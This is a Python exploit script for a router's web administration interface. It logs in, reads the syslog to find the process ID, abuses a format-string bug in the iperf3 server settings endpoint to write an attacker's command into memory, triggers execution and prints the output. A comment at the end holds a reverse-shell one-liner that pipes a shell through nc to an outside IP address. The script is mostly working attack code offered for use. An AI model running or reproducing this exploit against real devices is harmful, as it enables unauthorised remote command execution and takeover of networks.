import requests
import struct
import base64
import re
from argparse import ArgumentParser

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

SYSTEMCMD_ADDR = 0x0f3ecc

def send_payload(host, session, body):
    try:
        r = session.post(f"{host}/set_iperf3_svr.cgi", data=body)
        if "window.top.location.href='/Main_Login.asp'" in r.text:
            print("Invalid auth token or UserAgent")
            exit(-1)
        return r
    except requests.exceptions.ConnectionError as e:
        if 'RemoteDisconnected' in str(e):
            print("Remote Disconnected: something went wrong and the httpd daemon crashed. It will be back soon.")
        else:
            print(e)
        exit(-1)

def fmtstr(where, what, is_httpds=False, pid_len=5):
    if len(what)!=2:
        raise ValueError('what too big')
    size = 0x16
    where = struct.pack('<I', where).replace(b'\x00', b'\\u0000').replace(b'"', b'\\u0022')
    what = struct.unpack('<h', what.encode())[0] - size - (1 if is_httpds else 0) + (5 - pid_len)
    psize = (13 if is_httpds else 14) - len(str(what)) + (5 - pid_len)
    x = f"{{\"iperf3_svr_port\": 8080, \"rc_service\": \"%25{what}c%25{hex(size)[2:]}$hn{'A'*psize}where\"}}"
    # UTF-8 sucks
    return x.encode().replace(b'where', where)

def execute(host, session, cmd, is_httpds=False, pid_len=5):
    print("Executing: ", end='')
    if len(cmd)>2:
        cmd = list(cmd[0+i:2+i].ljust(2, '\x00') for i in range(0, len(cmd), 2))
    else:
        cmd = [cmd.ljust(2, '\x00')]

    for offset, part in enumerate(cmd):
        body = fmtstr(SYSTEMCMD_ADDR + offset * 2, part, is_httpds, pid_len)
        send_payload(host, session, body)
        print(part, end='')
    print('')


parser = ArgumentParser()
parser.add_argument('--url', required=True, help='The URL of the target')
parser.add_argument('--credentials', required=True, help='The authentication credentials')
parser.add_argument('--cmd', required=True, help='The command to execute')
args = parser.parse_args()

host = args.url
if not host.startswith('http'):
    exit("URL must starts with http or https")
if host[-1] == '/':
    host = host[:-1]

session = requests.Session()
session.verify=False
session.proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

# UserAgent is required during auth
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0"
session.headers.update({"User-Agent": user_agent, "Referer": f"{host}/"})

print("Performing login")

basic_auth = base64.b64encode(args.credentials.encode()).decode()
login_data = {"group_id": '', "action_mode": '', "action_script": '', "action_wait": "5", "current_page": "Main_Login.asp", "next_page": "index.asp", "login_authorization": basic_auth, "login_captcha": ''}
r = session.post(f"{host}/login.cgi", data=login_data)
if not "url=index.asp" in r.text:
    exit("Unknown error during login")

print("Testing vulnerable endpoint")

r = send_payload(host, session, {"iperf3_svr_port": 8080, "rc_service": "!!test!!"})
if '{"statusCode":"200"}' not in r.text:
    print(r.text)
    exit("Error in iperf3 endpoint")

print("Getting process name and pid from syslog")

r = session.get(f"{host}/appGet.cgi?hook=nvram_dump(%22syslog.log%22,%22syslog.sh%22)")
p = re.compile(r"rc_service:\s(\w+)\s(\d+):notify_rc !!test!!")
last_match = list(p.finditer(r.text))[-1]
is_httpds = last_match.group(1) == 'httpds'
pid_len = len(last_match.group(2))

print("Sending command parts")

execute(host, session, args.cmd, is_httpds, pid_len)

print("Exploit armed!")

session.get(f"{host}/Main_Analysis_Content.asp")

print("Exploit nuked.")

print("=================\nOutput:\n")

r = session.get(f"{host}/cmdRet_check.htm")
out = r.text
if out[:3].encode() == b"\xc3\xaf\xc2\xbb\xc2\xbf":
    print(out[3:])

# rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.42.102.133 7777 > /tmp/f
